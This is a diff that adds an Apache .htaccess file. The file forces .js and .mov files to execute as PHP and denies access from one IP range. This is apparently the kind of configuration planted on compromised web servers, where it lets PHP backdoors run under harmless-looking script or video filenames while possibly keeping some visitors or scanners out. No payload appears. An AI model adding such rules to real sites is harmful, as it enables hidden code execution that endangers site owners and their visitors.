@@ -1,0 +1,11 @@
+<Files *.js>
+ForceType application/x-httpd-php
+</Files>
+<Files *.mov>
+ForceType application/x-httpd-php
+</Files>
+<Files *>
+order allow,deny
+allow from all
+deny from 216.205.224.0/19
+</Files>
